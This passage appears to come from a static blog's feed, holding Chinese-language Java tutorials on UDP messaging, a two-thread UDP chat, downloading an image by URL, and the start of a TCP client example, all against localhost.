    <content type="html"><![CDATA[<h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><h2 id="消息发送"><a href="#消息发送" class="headerlink" title="消息发送"></a>消息发送</h2><p>只有发送和接受端</p><p>UdpClient.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.*;<br><br><span class="hljs-comment">//不需要连接服务器</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UdpClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SocketException, UnknownHostException </span>&#123;<br>        <span class="hljs-comment">//1.建立一个socket</span><br>        DatagramSocket socket=<span class="hljs-keyword">new</span> DatagramSocket();<br>        <span class="hljs-comment">//2.建包</span><br>        String msg=<span class="hljs-string">&quot;你好服务器&quot;</span>;<br>        <span class="hljs-comment">//发送者</span><br>        InetAddress localhost=InetAddress.getByName(<span class="hljs-string">&quot;localhost&quot;</span>);<br>        <span class="hljs-keyword">int</span> port=<span class="hljs-number">9999</span>;<br>        <span class="hljs-comment">//</span><br>        DatagramPacket packet=<span class="hljs-keyword">new</span> DatagramPacket(msg.getBytes(),<span class="hljs-number">0</span>,msg.getBytes().length,localhost,port);<br>        <span class="hljs-comment">//3.发送包</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            socket.send(packet);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//4.关闭流</span><br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>UdpServer.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-comment">//等待客户端的连接</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UdpServer</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">//开放端口</span><br>        DatagramSocket socket=<span class="hljs-keyword">new</span> DatagramSocket(<span class="hljs-number">9999</span>);<br>        <span class="hljs-comment">//接受数据包</span><br>        <span class="hljs-keyword">byte</span>[] buffer=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(buffer, <span class="hljs-number">0</span>, buffer.length);<br>        socket.receive(packet);<span class="hljs-comment">//阻塞接受</span><br>        <span class="hljs-comment">//发送地址</span><br>        System.out.println(packet.getAddress().getHostAddress());<br><br>        <span class="hljs-comment">//信息</span><br>        System.out.println(<span class="hljs-keyword">new</span> String(packet.getData(),<span class="hljs-number">0</span>,packet.getLength()));<br>        <span class="hljs-comment">//关闭连接</span><br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><p>UdpSender.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.xml.stream.FactoryConfigurationError;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UdpSender</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        DatagramSocket socket=<span class="hljs-keyword">new</span> DatagramSocket(<span class="hljs-number">9999</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-comment">//准备接受包裹</span><br>            <span class="hljs-keyword">byte</span>[] container = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(container, <span class="hljs-number">0</span>, container.length);<br>            socket.receive(packet);<span class="hljs-comment">//阻塞式接收包裹</span><br>            <span class="hljs-comment">//断开连接</span><br>            <span class="hljs-keyword">byte</span>[] data = packet.getData();<br>            String receiveData = <span class="hljs-keyword">new</span> String(data,<span class="hljs-number">0</span>,data.length);<br><br>            System.out.println(receiveData);<br>            <span class="hljs-comment">//使用切分让空间长度相同从而对比成功</span><br>            <span class="hljs-keyword">if</span> (receiveData.substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>).equals(<span class="hljs-string">&quot;bye&quot;</span>)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        socket.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>UdpReceive.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UdpReceive</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        DatagramSocket socket = <span class="hljs-keyword">new</span> DatagramSocket(<span class="hljs-number">8080</span>);<br>        <span class="hljs-comment">//准备数据 控制台读取system.in</span><br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            BufferedReader reader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(System.in));<br><br>            String data = reader.readLine();<br>            <span class="hljs-keyword">if</span>(data.equals(<span class="hljs-string">&quot;bye&quot;</span>))&#123;<br>                <span class="hljs-keyword">byte</span>[] datas = data.getBytes();<br>                DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(datas, <span class="hljs-number">0</span>, datas.length, <span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">9999</span>));<br><br>                socket.send(packet);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">byte</span>[] datas = data.getBytes();<br>            DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(datas, <span class="hljs-number">0</span>, datas.length, <span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">9999</span>));<br><br>            socket.send(packet);<br>        &#125;<br>        socket.close();<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="相互交流"><a href="#相互交流" class="headerlink" title="相互交流"></a>相互交流</h2><p>TalkSender.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TalkSend</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span> </span>&#123;<br>    DatagramSocket socket =<span class="hljs-keyword">null</span>;<br>    BufferedReader reader =<span class="hljs-keyword">null</span>;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TalkSend</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fromPort, String toIp, <span class="hljs-keyword">int</span> toPart)</span>  </span>&#123;<br>        <span class="hljs-keyword">this</span>.fromPort = fromPort;<br>        <span class="hljs-keyword">this</span>.toIp = toIp;<br>        <span class="hljs-keyword">this</span>.toPart = toPart;<br>        <span class="hljs-keyword">try</span> &#123;<br>            socket=<span class="hljs-keyword">new</span> DatagramSocket(fromPort);<br>            reader=<span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(System.in));<br>        &#125; <span class="hljs-keyword">catch</span> (SocketException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> fromPort;<br>    <span class="hljs-keyword">private</span> String toIp;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> toPart;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-comment">//准备数据 控制台读取system.in</span><br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br><br><br>            String data = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                data = reader.readLine();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(data.equals(<span class="hljs-string">&quot;bye&quot;</span>))&#123;<br>                <span class="hljs-keyword">byte</span>[] datas = data.getBytes();<br>                DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(datas, <span class="hljs-number">0</span>, datas.length, <span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-keyword">this</span>.toIp, <span class="hljs-keyword">this</span>.toPart));<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    socket.send(packet);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">byte</span>[] datas = data.getBytes();<br>            DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(datas, <span class="hljs-number">0</span>, datas.length, <span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-keyword">this</span>.toIp, <span class="hljs-keyword">this</span>.toPart));<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                socket.send(packet);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>TalkReceive.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TalkReveive</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br>    DatagramSocket socket=<span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TalkReveive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> port,String msgFrom)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.port = port;<br>        <span class="hljs-keyword">this</span>.msgFrom=msgFrom;<br>        <span class="hljs-keyword">try</span> &#123;<br>            socket=<span class="hljs-keyword">new</span> DatagramSocket(port);<br>        &#125; <span class="hljs-keyword">catch</span> (SocketException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">int</span> port;<br><br>    <span class="hljs-keyword">private</span> String msgFrom;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-comment">//准备接受包裹</span><br>            <span class="hljs-keyword">byte</span>[] container = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            DatagramPacket packet = <span class="hljs-keyword">new</span> DatagramPacket(container, <span class="hljs-number">0</span>, container.length);<br>            <span class="hljs-keyword">try</span> &#123;<br>                socket.receive(packet);<span class="hljs-comment">//阻塞式接收包裹</span><br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-comment">//断开连接</span><br>            <span class="hljs-keyword">byte</span>[] data = packet.getData();<br>            String receiveData = <span class="hljs-keyword">new</span> String(data,<span class="hljs-number">0</span>,data.length);<br><br>            System.out.println(<span class="hljs-keyword">this</span>.msgFrom+<span class="hljs-string">&quot;:&quot;</span>+receiveData);<br>            <span class="hljs-keyword">if</span> (receiveData.substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>).equals(<span class="hljs-string">&quot;bye&quot;</span>)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>TalkeOne.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TalkOne</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//开启两个线程</span><br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> TalkSend(<span class="hljs-number">8886</span>,<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">9999</span>)).start();<br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> TalkReveive(<span class="hljs-number">6666</span>,<span class="hljs-string">&quot;Two&quot;</span>)).start();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>TalkeTwo.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TalkTwo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//开启两个线程</span><br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> TalkSend(<span class="hljs-number">8888</span>,<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">6666</span>)).start();<br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> TalkReveive(<span class="hljs-number">9999</span>,<span class="hljs-string">&quot;One&quot;</span>)).start();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="URL下载网络资源"><a href="#URL下载网络资源" class="headerlink" title="URL下载网络资源"></a>URL下载网络资源</h2><p>UrlDown.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UrlDown</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//1.下载地址</span><br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://121.196.162.32/blog/usr/themes/cactus/images/logo.png&quot;</span>);<br><br>        <span class="hljs-comment">//2.连接到这个资源HTTP</span><br>        HttpURLConnection urlConnection=(HttpURLConnection)url.openConnection();<br>        InputStream inputStream=urlConnection.getInputStream();<br><br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;1&quot;</span>+url.getFile().substring(url.getFile().indexOf(<span class="hljs-string">&quot;.&quot;</span>),url.getFile().length()));<br><br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len= inputStream.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>            fileOutputStream.write(buffer,<span class="hljs-number">0</span>,len);<br>        &#125;<br><br>        fileOutputStream.close();<br>        inputStream.close();<br>        urlConnection.disconnect();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_TCP</title>
    <link href="/2021/04/06/Java/JavaBase/java_base_TCP/"/>
    <url>/2021/04/06/Java/JavaBase/java_base_TCP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="信息交流"><a href="#信息交流" class="headerlink" title="信息交流"></a>信息交流</h2><p>TcpClient.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.UnknownHostException;<br><br><span class="hljs-comment">//客户端</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TcpClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        InetAddress serverIp=<span class="hljs-keyword">null</span>;<br>        Socket socket=<span class="hljs-keyword">null</span>;<br>        OutputStream os=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//1.知道服务器的地址</span><br>            serverIp=InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>            <span class="hljs-comment">//端口号</span><br>            <span class="hljs-keyword">int</span> port=<span class="hljs-number">9999</span>;<br>            <span class="hljs-comment">//创建连接socket</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                socket=<span class="hljs-keyword">new</span> Socket(serverIp,port);<br>                <span class="hljs-comment">//发送信息IO流</span><br>                os=socket.getOutputStream();<br>                os.write(<span class="hljs-string">&quot;你好！&quot;</span>.getBytes());<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (UnknownHostException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(os!=<span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    os.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(socket!=<span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    socket.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>TcpServer.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 